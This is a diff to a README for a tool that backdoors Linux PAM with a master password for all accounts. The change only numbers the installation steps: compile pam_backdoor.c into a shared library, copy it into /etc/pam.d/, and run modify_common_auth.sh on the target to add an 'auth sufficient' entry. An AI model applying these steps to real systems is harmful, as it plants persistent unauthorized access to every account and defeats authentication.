@@ -5,12 +5,13 @@ Small script and C file for "backdooring" PAM and adding a master password to al
 
 ## Installation
 
-Compile the C code like so:
+1) Compile the C code like so:
+
 `gcc -fPIC -shared -o pam_login.so pam_backdoor.c`
 
-Transfer the binary to `/etc/pam.d/`
+2) Transfer the binary to `/etc/pam.d/`
 
-Modify PAM's `common-auth` file using `modify_common_auth.sh` on the target system. Feel free to modify this script if you don't want to upload the binary to `/etc/pam.d/` and instead want to use the default directory for PAM (for example, `/lib/x86_64-linux-gnu/security/` on Ubuntu)--you won't need to specify an absolute path after `auth sufficient`. 
+3) Modify PAM's `common-auth` file using `modify_common_auth.sh` on the target system. Feel free to modify this script if you don't want to upload the binary to `/etc/pam.d/` and instead want to use the default directory for PAM (for example, `/lib/x86_64-linux-gnu/security/` on Ubuntu)--you won't need to specify an absolute path after `auth sufficient`. 
 
 ## Information
 
